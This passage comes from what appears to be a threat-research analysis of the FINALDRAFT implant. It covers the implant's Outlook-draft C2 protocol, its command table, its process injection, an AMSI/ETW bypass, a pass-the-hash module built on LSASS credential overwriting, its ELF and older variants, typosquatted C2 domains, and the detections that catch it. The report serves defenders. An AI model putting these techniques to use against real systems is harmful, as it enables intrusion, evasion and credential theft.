<p>The command queue is filled by checking the last five C2 command request emails in the mail drafts, which have subjects <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">r_&lt;session-id&gt;</code>.</p>
<p></p>
<p></p>
<p>After reading the request, emails are then deleted.</p>
<p></p>
<p>Commands are then processed, and responses are written into new draft emails, each with the same <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">p_&lt;session-id&gt;</code> subject for each command response.</p>
<p></p>
<p>Content for message requests and responses are <strong>Zlib</strong> compressed, <strong>AES CBC</strong> encrypted, and Base64 encoded. The AES key used for encryption and decryption is located in the configuration blob.</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Base64(AESEncrypt(ZlibCompress(data)))</code></p>
<p>Request messages sent from the C2 to the implant follow this structure.</p>
<pre><code>struct C2Message{
  struct {
    uint8_t random_bytes[0x1E];  
    uint32_t message_size;    
    uint64_t session_id;      
  } header;                     // Size: 0x2A (42 bytes)
  
  struct {
    uint32_t command_size;                     
    uint32_t next_command_struct_offset;
    uint8_t command_id;                   
    uint8_t unknown[8];                   
    uint8_t command_args[];                       
  } commands[];
};</code></pre>
<p><em>Request message structure</em></p>
<p>Response messages sent from the implant to C2 follow this structure.</p>
<pre><code>struct ImplantMessage {
  struct Header {
    uint8_t random_bytes[0x1E];  
    uint32_t total_size;    
    uint8_t flag;		// Set to 1
    uint64_t session_id;
    uint16_t build_id;
    uint8_t pad[6];
  } header;
  
  struct Message {
    uint32_t actual_data_size_add_0xf;
    uint8_t command_id;
    uint8_t unknown[8];
    uint8_t flag_success;
    char newline[0x2];
    uint8_t actual_data[];
  }                    
};</code></pre>
<p><em>Response message structure</em></p>
<p>Here is an example of data stolen by the implant.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="commands" class="absolute -top-32"></span>Commands</h3>
<p>FinalDraft registers 37 command handlers, with most capabilities revolving around process injection, file manipulation, and network proxy capabilities.</p>
<p></p>
<p>Below is a table of the commands and their IDs:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">ID</th><th align="left">Name</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">GatherComputerInformation</td></tr><tr><td align="left">2</td><td align="left">StartTcpServerProxyToC2</td></tr><tr><td align="left">3</td><td align="left">StopTcpServerProxyToC2</td></tr><tr><td align="left">4</td><td align="left">ConnectToTcpTargetStartProxyToC2</td></tr><tr><td align="left">5</td><td align="left">SetSleepValue</td></tr><tr><td align="left">6</td><td align="left">DeleteNetworkProjectorFwRuleAndStopTCPServer</td></tr><tr><td align="left">8</td><td align="left">ConnectToTcpTarget</td></tr><tr><td align="left">9</td><td align="left">SendDataToUdpOrTcpTarget</td></tr><tr><td align="left">10</td><td align="left">CloseTcpConnection</td></tr><tr><td align="left">11</td><td align="left">DoProcessInjectionSendOutputEx</td></tr><tr><td align="left">12</td><td align="left">ListFiles</td></tr><tr><td align="left">13</td><td align="left">ListAvailableDrives</td></tr><tr><td align="left">14</td><td align="left">CreateDirectory</td></tr><tr><td align="left">15</td><td align="left">DeleteFileOrDirectory</td></tr><tr><td align="left">16</td><td align="left">DownloadFile</td></tr><tr><td align="left">17</td><td align="left">UploadFile0</td></tr><tr><td align="left">18</td><td align="left">DummyFunction</td></tr><tr><td align="left">19</td><td align="left">SetCurrentDirectory</td></tr><tr><td align="left">20</td><td align="left">GetCurrentDirectory</td></tr><tr><td align="left">21</td><td align="left">ListRunningProcesses</td></tr><tr><td align="left">24</td><td align="left">DoProcessInjectionNoOutput</td></tr><tr><td align="left">25</td><td align="left">DoProcessInjectionNoOutput (Same as 24)</td></tr><tr><td align="left">26</td><td align="left">DoProcessInjectionSendOutput1</td></tr><tr><td align="left">28</td><td align="left">DisconnectFromNamedPipe</td></tr><tr><td align="left">30</td><td align="left">ConnectToNamedPipeAndProxyMessageToC2</td></tr><tr><td align="left">31</td><td align="left">GetCurrentProcessTokenInformation</td></tr><tr><td align="left">32</td><td align="left">EnumerateActiveSessions</td></tr><tr><td align="left">33</td><td align="left">ListActiveTcpUdpConnections</td></tr><tr><td align="left">35</td><td align="left">MoveFile1</td></tr><tr><td align="left">36</td><td align="left">GetOrSetFileTime</td></tr><tr><td align="left">39</td><td align="left">UploadFile1</td></tr><tr><td align="left">41</td><td align="left">MoveFile0</td></tr><tr><td align="left">42</td><td align="left">CopyFileOrCopyDirectory</td></tr><tr><td align="left">43</td><td align="left">TerminateProcess</td></tr><tr><td align="left">44</td><td align="left">CreateProcess</td></tr></tbody></table></div>
<p><em>FINALDRAFT command handler table</em></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="gather-computer-information" class="absolute -top-32"></span>Gather computer information</h3>
<p>Upon execution of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GatherComputerInformation</code> command, information about the victim machine is collected and sent by FINALDRAFT. This information includes the computer name, the account username, internal and external IP addresses, and details about running processes.</p>
<p>This structure is described as follows:</p>
<pre><code>struct ComputerInformation
{
  char field_0;
  uint64_t session_id;
  char field_9[9];
  char username[50];
  char computer_name[50];
  char field_76[16];
  char external_ip_address[20];
  char internal_ip_address[20];
  uint32_t sleep_value;
  char field_B2;
  uint32_t os_major_version;
  uint32_t os_minor_version;
  bool product_type;
  uint32_t os_build_number;
  uint16_t os_service_pack_major;
  char field_C2[85];
  char field_117;
  char current_module_name[50];
  uint32_t current_process_id;
};</code></pre>
<p><em>Collected information structure</em></p>
<p>The external IP address is collected when enabled in the configuration.</p>
<p></p>
<p>This address is obtained by FINALDRAFT using the following list of public services.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Public service</th></tr></thead><tbody><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hxxps://ip-api.io/json</code></td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hxxps://ipinfo.io/json</code></td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hxxps://myexternalip.com/raw</code></td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hxxps://ipapi.co/json/</code></td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hxxps://jsonip.com/</code></td></tr></tbody></table></div>
<p><em>IP lookup service list</em></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="process-injection" class="absolute -top-32"></span>Process injection</h3>
<p>FINALDRAFT has multiple process injection-related commands that can inject into either running processes or create a hidden process to inject into.</p>
<p>In cases where a process is created, the target process is either an executable path provided as a parameter to the command or defaults to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mspaint.exe</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">conhost.exe</code> as a fallback.</p>
<p></p>
<p></p>
<p>Depending on the command and its parameters, the process can be optionally created with its standard output handle piped. In this case, once the process is injected, FINALDRAFT reads from the pipe&#x27;s output and sends its content along with the command response.</p>
<p></p>
<p></p>
<p>Another option exists where, instead of piping the standard handle of the process, FINALDRAFT, after creating and injecting the process, waits for the payload to create a Windows named pipe. It then connects to the pipe, writes some information to it, reads its output, and sends the data to the C2 through a separate channel. (In the case of the Outlook transport channel, this involves creating an additional draft email.).</p>
<p></p>
<p></p>
<p>The process injection procedure is basic and based on <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">VirtualAllocEx</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">WriteProcessMemory</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RtlCreateUserThread</code> API.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="forwarding-data-from-tcp-udp-and-named-pipes" class="absolute -top-32"></span>Forwarding data from TCP, UDP, and named pipes</h3>
<p>FINALDRAFT offers various methods of proxying data to C2, including UDP and TCP listeners, and a named pipe client.</p>
<p>Proxying UDP and TCP data involves handling incoming communication differently based on the protocol. For UDP, messages are received directly from the sender, while for TCP, client connections are accepted before receiving data. In both cases, the data is read from the socket and forwarded to the transport channel.</p>
<p>Below is an example screenshot of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">recvfrom</code> call from the UDP listener.</p>
<p></p>
<p>Before starting the TCP listener server, FINALDRAFT adds a rule to the Windows Firewall. This rule is removed when the server shuts down. To add/remove these rules the malware uses <strong>COM</strong> and the <a href="https://learn.microsoft.com/en-us/windows/win32/api/netfw/nn-netfw-inetfwpolicy2">INetFwPolicy2</a> and the <a href="https://learn.microsoft.com/en-us/windows/win32/api/netfw/nn-netfw-inetfwrule">INetFwRule</a> interfaces.</p>
<p></p>
<p></p>
<p>FINALDRAFT can also establish a TCP connection to a target. In this case, it sends a magic value, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">“\x12\x34\xab\xcd\ff\xff\xcd\xab\x34\x12”</code> and expects the server to echo the same magic value back before beginning to forward the received data.</p>
<p></p>
<p></p>
<p>For the named pipe, FINALDRAFT only connects to an existing pipe. The pipe name must be provided as a parameter to the command, after which it reads the data and forwards it through a separate channel.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="file-manipulation" class="absolute -top-32"></span>File manipulation</h3>
<p>For the file deletion functionality, FINALDRAFT prevents file recovery by overwriting file data with zeros before deleting them.</p>
<p></p>
<p>FINALDRAFT defaults to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CopyFileW</code> for file copying. However, if it fails, it will attempt to copy the file at the NTFS cluster level.</p>
<p>It first opens the source file as a drive handle. To retrieve the cluster size of the volume where the file resides, it uses <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetDiskFreeSpaceW</code> to retrieve information about the number of sectors per cluster and bytes per sector. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DeviceIoControl</code> is then called with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">FSCTL_GET_RETRIEVAL_POINTERS</code> to retrieve details of extents: locations on disk storing the data of the specified file and how much data is stored there in terms of cluster size.</p>
<p></p>
<p>For each extent, it uses <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SetFilePointer</code> to move the source file pointer to the corresponding offset in the volume; reading and writing one cluster of data at a time from the source file to the destination file.</p>
<p></p>
<p>If the file does not have associated cluster mappings, it is a resident file, and data is stored in the MFT itself. It uses the file&#x27;s MFT index to get its raw MFT record. The record is then parsed to locate the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">$DATA</code> attribute (type identifier  = 128). Data is then extracted from this attribute and written to the destination file using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">WriteFile</code>.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="injected-modules" class="absolute -top-32"></span>Injected Modules</h3>
<p>Our team observed several additional modules loaded through the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DoProcessInjectionSendOutputEx</code> command handler performing process injection and writing the output back through a named pipe. This shellcode injected by FINALDRAFT leverages the well-known <a href="https://github.com/monoxgas/sRDI/blob/master/ShellcodeRDI/ShellcodeRDI.c">sRDI</a> project, enabling the loading of a fully-fledged PE DLL into memory within the same process, resolving its imports and calling its export entrypoint.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="network-enumeration-ipconfigx64dll" class="absolute -top-32"></span>Network enumeration (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ipconfig.x64.dll</code>)</h4>
<p>This module creates a named pipe (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">\\.\Pipe\E340C955-15B6-4ec9-9522-1F526E6FBBF1</code>) waiting for FINALDRAFT to connect to it.  Perhaps to prevent analysis/sandboxing, the threat actor used a password (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Aslire597</code>) as an argument, if the password is incorrect, the module will not run.</p>
<p></p>
<p>As its name suggests, this module is a custom implementation of the ipconfig command retrieving networking information using Windows API’s (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetAdaptersAddresses</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetAdaptersInfo</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetNetworkParams</code>) and reading the Windows registry keypath (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces</code>). After the data is retrieved, it is sent back to FINALDRAFT through the named pipe.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="powershell-execution-psloaderx64dll" class="absolute -top-32"></span>PowerShell execution (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Psloader.x64.dll</code>)</h4>
<p>This module allows the operator to execute PowerShell commands without invoking the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">powershell.exe</code> binary. The code used is taken from <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/SharpPick/Program.cs">PowerPick</a>, a well-known open source offensive security tool.</p>
<p>To evade detection, the module first hooks the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">EtwEventWrite</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ReportEventW</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">AmsiScanBuffer</code> APIs, forcing them to always return <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0</code>, which disables ETW logging and bypasses anti-malware scans.</p>
<p></p>
<p>Next, the DLL loads a .NET payload (<a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/SharpPick/Program.cs">PowerPick</a>) stored in its <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.data</code> section using the <a href="https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/clr-hosting-interfaces">CLR Hosting technique</a>.</p>
<p></p>
<p>The module creates a named pipe (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">\\.\Pipe\BD5AE956-0CF5-44b5-8061-208F5D0DBBB2</code>) which is used for command forwarding and output retrieval. The main thread is designated as the receiver, while a secondary thread is created to write data to the pipe. Finally, the managed <strong>PowerPick</strong> binary is loaded and executed by the module.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="pass-the-hash-toolkit-pntx64dll" class="absolute -top-32"></span>Pass-the-Hash toolkit (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pnt.x64.dll</code>)</h4>
<p>This module is a custom Pass-the-Hash (PTH) toolkit used to start new processes with stolen NTLM hashes. This PTH implementation is largely inspired by the one used by <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>, enabling lateral movement.</p>
<p></p>
<p>A password (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Aslire597</code>), domain, and username with the NTLM hash, along with the file path of the program to be elevated, are required by this module. In our sample, this command line is loaded by the sRDI shellcode. Below is an example of the command line.</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">program.exe &lt;password&gt; &lt;domain&gt;\&lt;account&gt;:&lt;ntlm_hash&gt; &lt;target_process&gt;</code></p>
<p>Like the other module, it creates a named pipe, ”<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">\\.\Pipe\EAA0BF8D-CA6C-45eb-9751-6269C70813C9</code>”, and awaits incoming connections from FINALDRAFT. This named pipe serves as a logging channel.</p>
<p></p>
<p>After establishing the pipe connection, the malware creates a target process in a suspended state using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CreateProcessWithLogonW</code>, identifies key structures like the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LogonSessionList</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LogonSessionListCount</code> within the Local Security Authority Subsystem Service (LSASS) process, targeting the logon session specified by the provided argument.</p>
<p>Once the correct session is matched, the current credential structure inside LSASS is overwritten with the supplied NTLM hash instead of the current user&#x27;s NTLM hash, and finally, the process thread is resumed. This technique is well explained in the blog post &quot;<a href="https://www.praetorian.com/blog/inside-mimikatz-part2/">Inside the Mimikatz Pass-the-Hash Command (Part 2)</a>&quot; by Praetorian. The result is then sent to the named pipe.</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="finaldraft-elf-variant" class="absolute -top-32"></span>FINALDRAFT ELF variant</h2>
<p>During this investigation, we discovered an ELF variant of FINALDRAFT. This version supports more transport protocols than the PE version, but has fewer features, suggesting it might be under development.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="additional-transport-channels" class="absolute -top-32"></span>Additional transport channels</h3>
<p>The ELF variant of FINALDRAFT supports seven additional protocols for C2 transport channels:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">C2 communication protocols</th></tr></thead><tbody><tr><td align="left">HTTP/HTTPS</td></tr><tr><td align="left">Reverse UDP</td></tr><tr><td align="left">ICMP</td></tr><tr><td align="left">Bind TCP</td></tr><tr><td align="left">Reverse TCP</td></tr><tr><td align="left">DNS</td></tr><tr><td align="left">Outlook via REST API (could be communicating with an API proxy)</td></tr><tr><td align="left">Outlook via Graph API</td></tr></tbody></table></div>
<p><em>FINALDRAFT ELF variant C2 communication options</em></p>
<p>From the ELF samples discovered, we have identified implants configured to use the HTTP and Outlook via Graph API channels.</p>
<p>While the code structure is similar to the most contemporary PE sample, at the time of this publication, some parts of the implant&#x27;s functionality were modified to conform to the Linux environment. For example, new Microsoft OAuth refresh tokens requested are written to a file on disk, either <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/log/installlog.log.&lt;UUID_from_config&gt;</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/mnt/hgfsdisk.log.&lt;UUID_from_config&gt;</code> if it fails to write to the prior file.</p>
<p>Below is a snippet of the configuration which uses the HTTP channel. We can see two C2 servers are used in place of a Microsoft refresh token, the port number <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x1bb</code> (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">443</code>) at offset <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xc8</code>, and flag for using HTTPS at offset <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xfc</code>.</p>
<p></p>
<p>The domains are intentionally designed to typosquat well-known vendors, such as &quot;VMSphere&quot; (VMware vSphere). However, it&#x27;s unclear which vendor &quot;Hobiter&quot; is attempting to impersonate in this instance.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">C2</th></tr></thead><tbody><tr><td align="left">support.vmphere.com</td></tr><tr><td align="left">update.hobiter.com</td></tr></tbody></table></div>
<p><em>Domain list</em></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="commands-1" class="absolute -top-32"></span>Commands</h3>
<p></p>
<p>All of the commands overlap with its Windows counterpart, but offer fewer options. There are two C2 commands dedicated to collecting information about the victim&#x27;s machine. Together, these commands gather the following details:</p>
<ul>
<li>Hostname</li>
<li>Current logged-in user</li>
<li>Intranet IP address</li>
<li>External IP address</li>
<li>Gateway IP address</li>
<li>System boot time</li>
<li>Operating system name and version</li>
<li>Kernel version</li>
<li>System architecture</li>
<li>Machine GUID</li>
<li>List of active network connections</li>
<li>List of running processes</li>
<li>Name of current process</li>
</ul>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="command-execution" class="absolute -top-32"></span>Command Execution</h4>
<p>While there are no process injection capabilities, the implant can execute shell commands directly. It utilizes <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">popen</code> for command execution, capturing both standard output and errors, and sending the results back to the C2 infrastructure.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="self-deletion" class="absolute -top-32"></span>Self Deletion</h4>
<p>To dynamically resolve the path of the currently running executable, its symlink pointing to the executable image is passed to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sys_readlink</code>. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sys_unlink</code> is then called to remove the executable file from the filesystem.</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="older-finaldraft-pe-sample" class="absolute -top-32"></span>Older FINALDRAFT PE sample</h2>
<p>During our investigation, we identified an older version of FINALDRAFT. This version supports half as many commands but includes an additional transport protocol alongside the MS Graph API/Outlook transport channel.</p>
<p>The name of the binary is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Session.x64.dll</code>, and its entrypoint export is called <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GoogleProxy</code>:</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="http-transport-channel" class="absolute -top-32"></span>HTTP transport channel</h3>
<p>This older version of FINALDRAFT selects between the Outlook or HTTP transport channel based on the configuration.</p>
<p></p>
<p>In this sample, the configuration contains a list of hosts instead of the refresh token found in the main sample. These same domains were used by PATHLOADER, the domain (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">checkponit[.]com</code>) was registered on 2022-08-26T09:43:16Z and domain (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fortineat[.]com</code>) was registred on 2023-11-08T09:47:47Z.</p>
<p></p>
<p>The domains purposely typosquat real known vendors, <strong>CheckPoint</strong> and <strong>Fortinet</strong>, in this case.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">C2</th></tr></thead><tbody><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">poster.checkponit[.]com</code></td></tr><tr><td align="left"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">support.fortineat[.]com</code></td></tr></tbody></table></div>
<p><em>Domain list</em></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="shell-command" class="absolute -top-32"></span>Shell command</h3>
<p>An additional command exists in this sample that is not present in later versions. This command, with ID <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1</code>, executes a shell command.</p>
<p></p>
<p>The execution is carried out by creating a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cmd.exe</code> process with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">&quot;/c&quot;</code> parameter, followed by appending the actual command to the parameter.</p>
<p></p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="detection" class="absolute -top-32"></span>Detection</h1>
<p>Elastic Defend detects the process injection mechanism through two rules. The first rule detects the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">WriteProcessMemory</code> API call targeting another process, which is a common behavior observed in process injection techniques.</p>
<p></p>
<p>The second rule detects the creation of a remote thread to execute the shellcode.</p>
<p></p>
<p>We also detect the loading of the PowerShell engine by the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Psloader.x64.dll</code> module, which is injected into the known target <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mspaint.exe</code>.</p>
<p></p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="malware-and-mitre-attck" class="absolute -top-32"></span>Malware and MITRE ATT&amp;CK</h1>
<p>Elastic uses the <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> framework to document common tactics, techniques, and procedures that threats use against enterprise networks.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="tactics" class="absolute -top-32"></span>Tactics</h2>
<ul>
<li><a href="https://attack.mitre.org/tactics/TA0011/">Command and Control</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0005/">Defense Evasion</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0007/">Discovery</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0002/">Execution</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0010/">Exfiltration</a></li>
<li><a href="https://attack.mitre.org/tactics/TA0008/">Lateral Movement</a></li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="techniques" class="absolute -top-32"></span>Techniques</h2>
<p>Techniques represent how an adversary achieves a tactical goal by performing an action.</p>
<ul>
<li><a href="https://attack.mitre.org/techniques/T1102/003/">Web Service: One-Way Communication</a></li>
<li><a href="https://attack.mitre.org/techniques/T1573/001/">Encrypted Channel: Symmetric Cryptography</a></li>
<li><a href="https://attack.mitre.org/techniques/T1564/003/">Hide Artifacts: Hidden Window</a></li>
<li><a href="https://attack.mitre.org/techniques/T1036/005/">Masquerading: Match Legitimate Name or Location</a></li>
<li><a href="https://attack.mitre.org/techniques/T1036/003/">Masquerading: Rename System Utilities</a></li>
<li><a href="https://attack.mitre.org/techniques/T1055/002/">Process Injection: Portable Executable Injection</a></li>
<li><a href="https://attack.mitre.org/techniques/T1620/">Reflective Code Loading</a></li>
<li><a href="https://attack.mitre.org/techniques/T1550/002/">Use Alternate Authentication Material: Pass the Hash</a></li>
<li><a href="https://attack.mitre.org/techniques/T1046/">Network Service Discovery</a></li>
